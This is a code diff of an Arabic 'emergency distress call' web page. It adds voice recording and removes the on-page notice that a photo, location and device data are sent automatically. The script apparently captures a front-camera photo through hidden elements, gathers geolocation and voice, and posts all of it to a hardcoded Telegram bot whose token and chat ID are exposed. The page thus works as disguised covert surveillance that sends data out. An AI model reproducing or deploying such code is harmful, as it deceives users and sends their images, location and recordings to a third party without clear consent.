@@ -3,28 +3,36 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>نظام الطوارئ المتكامل</title>
+    <title>نظام الطوارئ المتكامل (صوت وصورة)</title>
     <style>
         body { font-family: sans-serif; background-color: #1a1a1a; color: white; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; }
         .container { background-color: #2d2d2d; padding: 25px; border-radius: 15px; width: 90%; max-width: 400px; text-align: center; border: 2px solid #ff4d4d; box-shadow: 0 0 20px rgba(255, 77, 77, 0.3); }
         h1 { color: #ff4d4d; margin-bottom: 5px; }
         p { font-size: 14px; color: #ccc; margin-bottom: 20px; }
-        textarea { width: 100%; height: 80px; padding: 10px; border-radius: 8px; background: #3d3d3d; color: white; border: 1px solid #444; box-sizing: border-box; font-size: 16px; }
-        button { width: 100%; padding: 18px; margin-top: 15px; border: none; border-radius: 8px; background-color: #ff4d4d; color: white; font-size: 20px; font-weight: bold; cursor: pointer; transition: 0.3s; }
-        button:active { transform: scale(0.95); background-color: #cc0000; }
-        #status { margin-top: 15px; font-size: 13px; color: #ffeb3b; min-height: 20px; }
-        video, canvas { display: none; } /* عناصر مخفية لمعالجة الصورة */
+        textarea { width: 100%; height: 80px; padding: 10px; border-radius: 8px; background: #3d3d3d; color: white; border: 1px solid #444; box-sizing: border-box; font-size: 16px; margin-bottom: 10px; }
+        .audio-controls { display: flex; gap: 10px; margin-bottom: 15px; }
+        .btn-audio { flex: 1; padding: 12px; border-radius: 8px; border: none; cursor: pointer; font-weight: bold; background-color: #444; color: white; }
+        .recording { background-color: #ff4d4d !important; animation: pulse 1s infinite; }
+        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
+        .btn-send { width: 100%; padding: 18px; border: none; border-radius: 8px; background-color: #4CAF50; color: white; font-size: 20px; font-weight: bold; cursor: pointer; }
+        #status { margin-top: 15px; font-size: 13px; color: #ffeb3b; }
+        video, canvas { display: none; }
     </style>
 </head>
 <body>
 
 <div class="container">
     <h1>🚨 نداء استغاثة</h1>
-    <p>سيتم إرسال (صورة، موقع، وقت، وبيانات الجهاز) تلقائياً</p>
+    <p>سجل صوتك أو اكتب رسالة للإرسال الفوري</p>
     
-    <textarea id="msgInput" placeholder="اكتب تفاصيل إضافية (اختياري)..."></textarea>
+    <textarea id="msgInput" placeholder="اكتب تفاصيل إضافية هنا..."></textarea>
     
-    <button id="sendBtn" onclick="startEmergencyProcess()">إرسال بلاغ شامل</button>
+    <div class="audio-controls">
+        <button id="recordBtn" class="btn-audio" onclick="toggleRecording()">🎤 تسجيل صوت</button>
+        <button id="stopBtn" class="btn-audio" onclick="stopRecording()" disabled>⏹️ إيقاف</button>
+    </div>
+    
+    <button id="sendBtn" class="btn-send" onclick="startEmergencyProcess()">إرسال البلاغ الآن</button>
     
     <div id="status"></div>
     
@@ -36,84 +44,95 @@
 const TOKEN = "8579983010:AAFKblFfzbNYk0bXOY6afuSZg3cIu35nobI";
 const CHAT_ID = "6837507867";
 
+let mediaRecorder;
+let audioChunks = [];
+let audioBlob = null;
+
+// وظائف تسجيل الصوت
+async function toggleRecording() {
+    audioChunks = [];
+    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+    mediaRecorder = new MediaRecorder(stream);
+    
+    mediaRecorder.ondataavailable = (event) => audioChunks.push(event.data);
+    mediaRecorder.onstop = () => {
+        audioBlob = new Blob(audioChunks, { type: 'audio/ogg; codecs=opus' });
+        document.getElementById('status').innerText = "✅ تم تجهيز المقطع الصوتي";
+    };
+
+    mediaRecorder.start();
+    document.getElementById('recordBtn').classList.add('recording');
+    document.getElementById('recordBtn').disabled = true;
+    document.getElementById('stopBtn').disabled = false;
+    document.getElementById('status').innerText = "🎙️ جاري التسجيل الآن...";
+}
+
+function stopRecording() {
+    mediaRecorder.stop();
+    document.getElementById('recordBtn').classList.remove('recording');
+    document.getElementById('recordBtn').disabled = false;
+    document.getElementById('stopBtn').disabled = true;
+}
+
+// معالجة البلاغ الكامل
 async function startEmergencyProcess() {
     const status = document.getElementById('status');
     const btn = document.getElementById('sendBtn');
-    
     btn.disabled = true;
-    status.innerText = "جاري تحضير البيانات والكاميرا...";
+    status.innerText = "جاري جمع الموقع والصورة وإرسال البيانات...";
 
     let photoBlob = null;
     let locationStr = "الموقع غير متاح";
 
-    // 1. محاولة التقاط صورة
+    // 1. التقاط صورة تلقائية
     try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
         const video = document.getElementById('video');
         video.srcObject = stream;
-        
-        // الانتظار قليلاً لتشغيل الكاميرا ثم التقاط الصورة
-        await new Promise(resolve => setTimeout(resolve, 1000));
+        await new Promise(res => setTimeout(res, 1000));
         const canvas = document.getElementById('canvas');
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
+        canvas.width = video.videoWidth; canvas.height = video.videoHeight;
         canvas.getContext('2d').drawImage(video, 0, 0);
-        
-        photoBlob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
-        
-        // إغلاق الكاميرا بعد الالتقاط
-        stream.getTracks().forEach(track => track.stop());
-    } catch (err) {
-        console.log("Camera failed or denied");
-    }
+        photoBlob = await new Promise(res => canvas.toBlob(res, 'image/jpeg'));
+        stream.getTracks().forEach(t => t.stop());
+    } catch (e) { console.log("Camera error"); }
 
-    // 2. محاولة جلب الموقع
+    // 2. جلب الموقع
     if (navigator.geolocation) {
         try {
             const pos = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej));
             locationStr = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-        } catch (err) {
-            locationStr = "الموقع (تم رفض الإذن)";
-        }
+        } catch (e) { locationStr = "الموقع (مرفوض)"; }
     }
 
-    // 3. تجهيز البيانات الأخرى
     const time = new Date().toLocaleString('ar-YE');
-    const device = navigator.userAgent.includes("Android") ? "Android Device" : "Mobile/PC";
-    const userNote = document.getElementById('msgInput').value || "لا توجد ملاحظات";
+    const userNote = document.getElementById('msgInput').value || "بدون نص";
+    const caption = `🚨 بلاغ طوارئ جديد\n📝: ${userNote}\n📍: ${locationStr}\n⏰: ${time}`;
 
-    const caption = `🚨 **بلاغ طوارئ جديد** 🚨\n\n` +
-                    `📝 **البلاغ:** ${userNote}\n` +
-                    `📍 **الموقع:** ${locationStr}\n` +
-                    `⏰ **الوقت:** ${time}\n` +
-                    `📱 **الجهاز:** ${device}`;
-
-    // 4. الإرسال إلى تليجرام
     try {
+        // إرسال الصورة أولاً مع البيانات
         if (photoBlob) {
-            // إرسال كصورة مع الوصف
-            const formData = new FormData();
-            formData.append('chat_id', CHAT_ID);
-            formData.append('photo', photoBlob, 'emergency.jpg');
-            formData.append('caption', caption);
-            formData.append('parse_mode', 'Markdown');
-
-            await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: formData });
-        } else {
-            // إرسال كنص فقط إذا فشلت الكاميرا
-            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: CHAT_ID, text: caption, parse_mode: "Markdown" })
-            });
+            const fd = new FormData();
+            fd.append('chat_id', CHAT_ID);
+            fd.append('photo', photoBlob, 'img.jpg');
+            fd.append('caption', caption);
+            await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
         }
-        status.innerHTML = "✅ تم إرسال البلاغ الشامل بنجاح!";
+
+        // إرسال التسجيل الصوتي إذا وجد
+        if (audioBlob) {
+            const fdAudio = new FormData();
+            fdAudio.append('chat_id', CHAT_ID);
+            fdAudio.append('voice', audioBlob, 'voice.ogg');
+            await fetch(`https://api.telegram.org/bot${TOKEN}/sendVoice`, { method: 'POST', body: fdAudio });
+        }
+
+        status.innerHTML = "✅ تم إرسال كل شيء بنجاح!";
         status.style.color = "#4CAF50";
-    } catch (error) {
-        status.innerText = "❌ فشل في الإرسال";
-        status.style.color = "#ff4d4d";
+        audioBlob = null; // تصفير الصوت بعد الإرسال
+    } catch (err) {
+        status.innerText = "❌ فشل الإرسال";
     }
-    
     btn.disabled = false;
 }
 </script>
